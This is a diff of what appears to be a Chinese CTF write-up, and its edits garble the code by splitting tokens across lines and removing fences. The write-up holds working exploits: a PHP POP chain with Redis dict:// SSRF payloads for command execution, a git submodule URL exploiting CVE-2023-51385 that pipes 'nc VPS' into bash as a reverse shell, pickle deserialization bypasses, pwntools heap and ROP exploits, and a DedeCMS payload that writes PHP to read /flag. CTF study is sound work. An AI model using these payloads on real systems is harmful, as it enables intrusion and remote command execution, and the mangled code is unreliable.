@@ -25,7 +25,8 @@ cc= []
 for i in x:
     try:
         cc.append(i[11:-6])
-    except:
+    
+except:
         pass
 xx = cc[5:]
 with open('cc.txt','w') as w:
@@ -36,7 +37,8 @@ with open('cc.txt','r') as r:
     a = r.read()[2:-2]
 a= a.split("', '")
 
-a.sort(key=lambda x:int(x[0:-5]))  # 手动删掉文本里面的 '1_     '
+a.sort(key=lambda x:
+int(x[0:-5]))  # 手动删掉文本里面的 '1_     '
 # print(a)
 for cx in a:
     kkey+= cx[-4:]
@@ -122,7 +124,7 @@ class Rd
 
     public function __destruct()
     {
-        echo "All matters have concluded"."</br>";
+        echo "All matters have concluded"."";
     }
 
     public function __call($name, $arg)
@@ -150,7 +152,7 @@ class Poc
 
     function getflag($paylaod)
     {
-        echo "Have you genuinely accomplished what you set out to do?"."</br>";
+        echo "Have you genuinely accomplished what you set out to do?"."";
         file_get_contents($paylaod);
     }
 }
@@ -171,7 +173,7 @@ class Er
                $value($this->Flag);
         }
     else {
-    echo "NoNoNo,please you can look hint.php"."</br>";
+    echo "NoNoNo,please you can look hint.php"."";
     }
     }
 
@@ -185,14 +187,14 @@ class Ha
 
     public function __construct()
     {
-        echo $this->start1 . "__construct" . "</br>";
+        echo $this->start1 . "__construct" . "";
     }
 
     public function __destruct()
     {
         if ($this->start2 === "o.0") {
             $this->start1->Love($this->start);
-            echo "You are Good!"."</br>";
+            echo "You are Good!"."";
         }
     }
 }
@@ -237,7 +239,7 @@ class Rd
     }
     public function __destruct()
     {
-        echo "All matters have concluded"."</br>";
+        echo "All matters have concluded"."";
     }
 
     public function __call($name, $arg)
@@ -256,13 +258,30 @@ class Er{
     public $Flag;
 
     public function __construct(){
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/info');
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dir:/tmp'); //设置目录
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:get:dir'); //获取
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dbfilename:exp.so');
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/slaveof:修改为自己的VPS:2222');
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/module:load:./exp.so'); //加载exp.so
-        $this->Flag = base64_encode('dict://127.0.0.1:6379/system.exec:"env"'); //命令执行
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/info');
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/config:
+set:
+dir:/tmp'); //设置目录
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/config:
+get:
+dir'); //获取
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/config:
+set:
+dbfilename:
+exp.so');
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/slaveof:
+修改为自己的VPS:
+2222');
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/module:
+load:./exp.so'); //加载exp.so
+        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/system.exec:"env"'); //命令执行
     }
 
     public function __set($name, $value)
@@ -271,7 +290,7 @@ class Er{
             $value($this->Flag);
         }
         else {
-            echo "NoNoNo,please you can look hint.php"."</br>";
+            echo "NoNoNo,please you can look hint.php"."";
         }
     }
 
@@ -284,14 +303,14 @@ class Ha{
 
 /*    public function __construct()
     {
-        echo $this->start1 . "__construct" . "</br>";
+        echo $this->start1 . "__construct" . "";
     }*/
 
     public function __destruct()
     {
         if ($this->start2 === "o.0") {
             $this->start1->Love($this->start);
-            echo "You are Good!"."</br>";
+            echo "You are Good!"."";
         }
     }
 
@@ -405,10 +424,12 @@ def pic():
         if session.get('username')=="admin":
             return pickle.load(open(filepath,"rb")) ## 漏洞点
         else:
-            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
-    res="<h1>files in ./uploads/</h1><br>"
+            return ''''''
+    res="<h1>files in ./uploads/</h1>
+"
     for f in os.listdir("./uploads"):
-        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
+        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a>
+"
     return res
 
 if __name__ == '__main__':
@@ -738,15 +759,19 @@ print("------")"""
 # The unique parameter r: 0x4f37fe985d13ffde9867fa0063f68dea79196408b1404eadf03ea59297d629c2183a4a6a6647b6c4c99dd43bae8c4fa4691a608d20170fd42b18aef7efb3ae01cd3
 # ------
 # Parameters are initialized to:
-#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709648d78eb17edb46dda768a97d57e6bd1c48657393b7c0d9c574c38cc0a3545ce7d209ade33b8ac6b31a41fe9f4ed62b4ddd7b99859b74915f2031dd2f5f0499a2f8
-#   e:0x2ebad696da6dda845bf03fdf34ee73d4849800de9267a5baa3c068e2d33a74727d00002fbfea775e5233087a9039d267130aa924a4f7fed3576f6ff7b8e1b2e8
+#   phi:
+0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709648d78eb17edb46dda768a97d57e6bd1c48657393b7c0d9c574c38cc0a3545ce7d209ade33b8ac6b31a41fe9f4ed62b4ddd7b99859b74915f2031dd2f5f0499a2f8
+#   e:
+0x2ebad696da6dda845bf03fdf34ee73d4849800de9267a5baa3c068e2d33a74727d00002fbfea775e5233087a9039d267130aa924a4f7fed3576f6ff7b8e1b2e8
 # But they are wild and crazy!
 # We have to give them a lesson!
 # ------
 # The loss is -0x5144bdad7cc24f5348c5752dda0ff5fa7d72e36370d5af55eb6f590ac0764b843a06ee1a4651b8f3a6c878df56f1678454e58eaf0ede9a1eb0503dce6a1303b69e33bbaad112abb051a28d51a9fee629e89400a338bd02998568d044852f11e05572fc4a0ddacdf7342048295a4025394e77e973621a77ea5bbdb06af2cb72b2f8298e2cd16736454fd066d3d96a4f77cd094cd783ead17024de981df7ade84aa8c282b1ec6f8ec6ec4752727387ef637ba2a4eed8f83c77d5db14d297de8098
 # Parameters are trained to:
-#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
-#   e:0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
+#   phi:
+0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
+#   e:
+0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
 # After training, the two naughty parameters are more and more normal.
 # It's closer to your target!
 # ------
@@ -1216,29 +1241,52 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   _main(argc, argv, envp);
   v11 = time(0i64);
   srand(v11);
-  std::string::string((#89 *)v7);
-  std::operator<<<std::char_traits<char>>((#106 *)&std::cout, aInputYourFlag);
-  std::operator>><char>(&std::cin, v7);
-  std::string::string((#89 *)v9, (const #89 *)v7);
+  std::
+string::
+string((#89 *)v7);
+  std::
+operator<<<std::
+char_traits<char>>((#106 *)&std::
+cout, aInputYourFlag);
+  std::
+operator>><char>(&std::
+cin, v7);
+  std::
+string::
+string((#89 *)v9, (const #89 *)v7);
   change((__int64)v8, (#89 *)v9);
-  std::string::operator=(v7, v8);
-  std::string::~string((#89 *)v8);
-  std::string::~string((#89 *)v9);
-  if ( std::string::length((#89 *)v7) != 42 )
+  std::
+string::
+operator=(v7, v8);
+  std::
+string::~string((#89 *)v8);
+  std::
+string::~string((#89 *)v9);
+  if ( std::
+string::
+length((#89 *)v7) != 42 )
   {
-    v3 = std::operator<<<std::char_traits<char>>((#106 *)&std::cout, "len error");
-    ((void (__fastcall *)(__int64))std::endl<char,std::char_traits<char>>)(v3);
+    v3 = std::
+operator<<<std::
+char_traits<char>>((#106 *)&std::
+cout, "len error");
+    ((void (__fastcall *)(__int64))std::
+endl<char,std::
+char_traits<char>>)(v3);
     exit(0);
   }
   qmemcpy(v6, &byte_46A020, 0xA8ui64);
   for ( i = 0; i <= 41; ++i )
   {
     v10 = rand() % 255;
-    v4 = (char *)std::string::operator[](v7, i);
+    v4 = (char *)std::
+string::
+operator[](v7, i);
     if ( (v10 ^ *v4) != v6[i] )
       exit(0);
   }
-  std::string::~string((#89 *)v7);
+  std::
+string::~string((#89 *)v7);
   return 0;
 }
 
@@ -1339,7 +1387,8 @@ TLS函数去除花指令之后
 
 然后反汇编得到正确的函数代码，Main函数主要是包含了另一个程序crypto.exe，然后调用这个程序里的加密函数，对文件进行加密。
 
-找加密位置，发现对文件路径和文件名字进行判断，这里需要来到D:Desktopdocument1.txt才可以进到加密函数位置。
+找加密位置，发现对文件路径和文件名字进行判断，这里需要来到D:
+Desktopdocument1.txt才可以进到加密函数位置。
 
 进到文件加密位置，调试可以看出是使用了CryptEncrypt函数进行加密
 
@@ -1385,7 +1434,8 @@ cc= []
 for i in x:
     try:
         cc.append(i[11:-6])
-    except:
+    
+except:
         pass
 xx = cc[5:]
 with open('cc.txt','w') as w:
@@ -1396,16 +1446,12 @@ with open('cc.txt','r') as r:
     a = r.read()[2:-2]
 a= a.split("', '")
 
-a.sort(key=lambda x:int(x[0:-5]))  # 手动删掉文本里面的 '1_     '
+a.sort(key=lambda x:
+int(x[0:-5]))  # 手动删掉文本里面的 '1_     '
 # print(a)
 for cx in a:
     kkey+= cx[-4:]
 print(kkey)
-```
-
-
-
-```
 <?php
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
 $O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
@@ -1417,31 +1463,11 @@ eval('?>'.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO
 $flag = gzinflate(base64_decode('U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA=='));
 echo $flag
 ?>
-```
-
-
-
-```
 OpenSSH ProxyCommand命令注入漏洞（CVE-2023-51385）
-```
-
-
-
-```
 [submodule "cve"]
  path = cve
  url = ssh://`nc VPS 3333|bash|nc VPS 3334`foo.ichunqiu.com/bar
-```
-
-
-
-```
 Redis主从复制``Pop
-```
-
-
-
-```
 <?php
 highlight_file(__FILE__);
 include "function.php";
@@ -1454,7 +1480,7 @@ class Rd
 
     public function __destruct()
     {
-        echo "All matters have concluded"."</br>";
+        echo "All matters have concluded"."";
     }
 
     public function __call($name, $arg)
@@ -1482,7 +1508,7 @@ class Poc
 
     function getflag($paylaod)
     {
-        echo "Have you genuinely accomplished what you set out to do?"."</br>";
+        echo "Have you genuinely accomplished what you set out to do?"."";
         file_get_contents($paylaod);
     }
 }
@@ -1503,7 +1529,7 @@ class Er
                $value($this->Flag);
         }
     else {
-    echo "NoNoNo,please you can look hint.php"."</br>";
+    echo "NoNoNo,please you can look hint.php"."";
     }
     }
 
@@ -1517,14 +1543,14 @@ class Ha
 
     public function __construct()
     {
-        echo $this->start1 . "__construct" . "</br>";
+        echo $this->start1 . "__construct" . "";
     }
 
     public function __destruct()
     {
         if ($this->start2 === "o.0") {
             $this->start1->Love($this->start);
-            echo "You are Good!"."</br>";
+            echo "You are Good!"."";
         }
     }
 }
@@ -1550,11 +1576,6 @@ if (isset($_POST['pop'])) {
 }
 
 ?>
-```
-
-
-
-```
 exp
 <?php
 highlight_file(__FILE__);
@@ -1571,7 +1592,7 @@ class Rd
     }
     public function __destruct()
     {
-        echo "All matters have concluded"."</br>";
+        echo "All matters have concluded"."";
     }
 
     public function __call($name, $arg)
@@ -1590,13 +1611,30 @@ class Er{
     public $Flag;
 
     public function __construct(){
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/info');
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dir:/tmp'); //设置目录
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:get:dir'); //获取
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/config:set:dbfilename:exp.so');
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/slaveof:修改为自己的VPS:2222');
-//        $this->Flag = base64_encode('dict://127.0.0.1:6379/module:load:./exp.so'); //加载exp.so
-        $this->Flag = base64_encode('dict://127.0.0.1:6379/system.exec:"env"'); //命令执行
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/info');
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/config:
+set:
+dir:/tmp'); //设置目录
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/config:
+get:
+dir'); //获取
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/config:
+set:
+dbfilename:
+exp.so');
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/slaveof:
+修改为自己的VPS:
+2222');
+//        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/module:
+load:./exp.so'); //加载exp.so
+        $this->Flag = base64_encode('dict://127.0.0.1:
+6379/system.exec:"env"'); //命令执行
     }
 
     public function __set($name, $value)
@@ -1605,7 +1643,7 @@ class Er{
             $value($this->Flag);
         }
         else {
-            echo "NoNoNo,please you can look hint.php"."</br>";
+            echo "NoNoNo,please you can look hint.php"."";
         }
     }
 
@@ -1618,14 +1656,14 @@ class Ha{
 
 /*    public function __construct()
     {
-        echo $this->start1 . "__construct" . "</br>";
+        echo $this->start1 . "__construct" . "";
     }*/
 
     public function __destruct()
     {
         if ($this->start2 === "o.0") {
             $this->start1->Love($this->start);
-            echo "You are Good!"."</br>";
+            echo "You are Good!"."";
         }
     }
 
@@ -1652,17 +1690,7 @@ class Ha{
 
 $a = new Ha();
 echo urlencode(serialize($a));
-```
-
-
-
-```
 O%3A2%3A%22Ha%22%3A3%3A%7Bs%3A5%3A%22start%22%3Ba%3A1%3A%7Bs%3A3%3A%22POC%22%3Bs%3A3%3A%220.o%22%3B%7Ds%3A6%3A%22start1%22%3BO%3A2%3A%22Rd%22%3A3%3A%7Bs%3A6%3A%22ending%22%3BN%3Bs%3A2%3A%22cl%22%3BO%3A2%3A%22Er%22%3A2%3A%7Bs%3A6%3A%22symbol%22%3BN%3Bs%3A4%3A%22Flag%22%3Bs%3A52%3A%22ZGljdDovLzEyNy4wLjAuMTo2Mzc5L3N5c3RlbS5leGVjOiJlbnYi%22%3B%7Ds%3A3%3A%22poc%22%3BN%3B%7Ds%3A6%3A%22start2%22%3Bs%3A3%3A%22o.0%22%3B%7D
-```
-
-
-
-```
 import os
 import pickle
 import base64
@@ -1719,19 +1747,16 @@ def pic():
         if session.get('username')=="admin":
             return pickle.load(open(filepath,"rb")) ## 漏洞点
         else:
-            return '''<img src="data:image/png;base64,'''+base64.b64encode(open(filepath,"rb").read()).decode()+'''">'''
-    res="<h1>files in ./uploads/</h1><br>"
+            return ''''''
+    res="<h1>files in ./uploads/</h1>
+"
     for f in os.listdir("./uploads"):
-        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a><br>"
+        res+="<a href='pic.php?pic="+f+"'>./uploads/"+f+"</a>
+"
     return res
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
-```
-
-
-
-```
 import hashlib
 
 class Users:
@@ -1770,11 +1795,6 @@ def waf(file):
 
     file.seek(0)
     return secure_filename(file.filename)
-```
-
-
-
-```
 import pickle
 import os
 
@@ -1807,15 +1827,10 @@ for b in [b"n", b"r", b"\", b"base", b"builtin", b"code", b"command", 
 
 # with open('payload.pkl', 'wb') as f:
 #     f.write(payload)
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc.so.6")
 """""
 def xxx():
@@ -1864,16 +1879,11 @@ p.sendafter("name: ",payload)
 p.sendafter("quit now?(Y/y)","Y")
 
 p.interactive()
-```
-
-
-
-```
 from importlib.resources import contents
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc.so.6")
 """""
 def xxx():
@@ -1968,11 +1978,6 @@ edit(3,b"A"*8+p64(pop_rsp)+p64(heap_base+0xa80)[:7])
 edit(7,b"B"*8+p64(add_rsp)[:7])
 
 p.interactive()
-```
-
-
-
-```
 from Crypto.Util.number import long_to_bytes, inverse
 import initialize
 import train
@@ -2026,15 +2031,19 @@ print("------")"""
 # The unique parameter r: 0x4f37fe985d13ffde9867fa0063f68dea79196408b1404eadf03ea59297d629c2183a4a6a6647b6c4c99dd43bae8c4fa4691a608d20170fd42b18aef7efb3ae01cd3
 # ------
 # Parameters are initialized to:
-#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709648d78eb17edb46dda768a97d57e6bd1c48657393b7c0d9c574c38cc0a3545ce7d209ade33b8ac6b31a41fe9f4ed62b4ddd7b99859b74915f2031dd2f5f0499a2f8
-#   e:0x2ebad696da6dda845bf03fdf34ee73d4849800de9267a5baa3c068e2d33a74727d00002fbfea775e5233087a9039d267130aa924a4f7fed3576f6ff7b8e1b2e8
+#   phi:
+0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709648d78eb17edb46dda768a97d57e6bd1c48657393b7c0d9c574c38cc0a3545ce7d209ade33b8ac6b31a41fe9f4ed62b4ddd7b99859b74915f2031dd2f5f0499a2f8
+#   e:
+0x2ebad696da6dda845bf03fdf34ee73d4849800de9267a5baa3c068e2d33a74727d00002fbfea775e5233087a9039d267130aa924a4f7fed3576f6ff7b8e1b2e8
 # But they are wild and crazy!
 # We have to give them a lesson!
 # ------
 # The loss is -0x5144bdad7cc24f5348c5752dda0ff5fa7d72e36370d5af55eb6f590ac0764b843a06ee1a4651b8f3a6c878df56f1678454e58eaf0ede9a1eb0503dce6a1303b69e33bbaad112abb051a28d51a9fee629e89400a338bd02998568d044852f11e05572fc4a0ddacdf7342048295a4025394e77e973621a77ea5bbdb06af2cb72b2f8298e2cd16736454fd066d3d96a4f77cd094cd783ead17024de981df7ade84aa8c282b1ec6f8ec6ec4752727387ef637ba2a4eed8f83c77d5db14d297de8098
 # Parameters are trained to:
-#   phi:0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
-#   e:0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
+#   phi:
+0x81c5f040bfaea676120cd62c36ba7afb303561504bbf8609afa3da60fb6202ca875b0bd2a06143ebcd16fa615557ff159d97909160d68e1938b3ecaf57709b3bb712fdcba325655f111918472d4353a66854ccda50b63a1047278c15a4b39cde898d054db87092958c7c05f8fa566dcd969b1ff4b7d1935c375a4af3bfc341b0
+#   e:
+0x2c22193ad9abcca2f67552fc76dd07b3ef883f3d755c95119cdf82bb6a07c970fd37e582bb49250d8efaa29b8a59c82059165c654206a9d7261f6b45a90dc69
 # After training, the two naughty parameters are more and more normal.
 # It's closer to your target!
 # ------
@@ -2060,11 +2069,6 @@ decoded_message = long_to_bytes(m1) + long_to_bytes(m2)
 
 flag = b"flag{" + decoded_message + b".}"
 print(flag)
-```
-
-
-
-```
 from Crypto.Util.number import *
 from gmpy2 import *
 import random, os
@@ -2123,11 +2127,6 @@ g= 6107356675771458732111444768433392835330094435511237805460358595573039552435
 y= 23678147495254433946472657196764372220306841739888385605070426528738230369489739339976134564575544246606937803367113623097260181789372915552172469427842482448570540429192377881186772226796452797182435452490307834205012154495575570994963829345053331967442452842152258650027916313982835119514473311305158299360
 (h1, r1, s1) = 535874494834828755542711401117152397489711233142, 117859946800380767356190121030392492081340616512, 26966646740134065096660259687229179143947213779
 (h2, r2, s2) = 236574518096866758760287021848258048065293279716, 863199000523521111517835459866422731857447792677, 517924607931342012033031470185302567344725962419
-```
-
-
-
-```
 from __future__ import print_function
 import time
 import sympy
@@ -2450,11 +2449,6 @@ def example():
 
 if __name__ == "__main__":
     example()
-```
-
-
-
-```
 from sage.matrix.all import Matrix, vector
 from sage.rings.all import Zmod
 
@@ -2476,11 +2470,6 @@ x = A.solve_right(b)
 
 # 打印解的字节表示
 print(long_to_bytes(int(x[1])))
-```
-
-
-
-```
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   __int64 v3; // rax
@@ -2496,39 +2485,57 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   _main(argc, argv, envp);
   v11 = time(0i64);
   srand(v11);
-  std::string::string((#89 *)v7);
-  std::operator<<<std::char_traits<char>>((#106 *)&std::cout, aInputYourFlag);
-  std::operator>><char>(&std::cin, v7);
-  std::string::string((#89 *)v9, (const #89 *)v7);
+  std::
+string::
+string((#89 *)v7);
+  std::
+operator<<<std::
+char_traits<char>>((#106 *)&std::
+cout, aInputYourFlag);
+  std::
+operator>><char>(&std::
+cin, v7);
+  std::
+string::
+string((#89 *)v9, (const #89 *)v7);
   change((__int64)v8, (#89 *)v9);
-  std::string::operator=(v7, v8);
-  std::string::~string((#89 *)v8);
-  std::string::~string((#89 *)v9);
-  if ( std::string::length((#89 *)v7) != 42 )
+  std::
+string::
+operator=(v7, v8);
+  std::
+string::~string((#89 *)v8);
+  std::
+string::~string((#89 *)v9);
+  if ( std::
+string::
+length((#89 *)v7) != 42 )
   {
-    v3 = std::operator<<<std::char_traits<char>>((#106 *)&std::cout, "len error");
-    ((void (__fastcall *)(__int64))std::endl<char,std::char_traits<char>>)(v3);
+    v3 = std::
+operator<<<std::
+char_traits<char>>((#106 *)&std::
+cout, "len error");
+    ((void (__fastcall *)(__int64))std::
+endl<char,std::
+char_traits<char>>)(v3);
     exit(0);
   }
   qmemcpy(v6, &byte_46A020, 0xA8ui64);
   for ( i = 0; i <= 41; ++i )
   {
     v10 = rand() % 255;
-    v4 = (char *)std::string::operator[](v7, i);
+    v4 = (char *)std::
+string::
+operator[](v7, i);
     if ( (v10 ^ *v4) != v6[i] )
       exit(0);
   }
-  std::string::~string((#89 *)v7);
+  std::
+string::~string((#89 *)v7);
   return 0;
 }
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <time.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <time.h>
 int main(){
     unsigned int seed;
     int key=0;
@@ -2580,17 +2587,7 @@ int main(){
     }
     return 0;
 }
-```
-
-
-
-```
 f{52bgb-281lg00ff-46f7-ca009c8e}a381-b7191
-```
-
-
-
-```
 # a = 'flag{0123456789zbcdexQhijkymnABCDEFGHIJKL}' # input
 # b = 'f{37bxjnDHLlg02468zceQikmACEGIK}a159dhyBFJ' # 换位后
 
@@ -2612,17 +2609,7 @@ for i in range(42):
 print("".join(flag))
 
 # flag{0305f8f2-14b6-fg7b-bc7a-010299c881e1}
-```
-
-
-
-```
 Main函数
-```
-
-
-
-```
 /dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=<?php+readfile("/flag");&token=ecb58488af4202afcce98347bbb9bddc
 ```
 
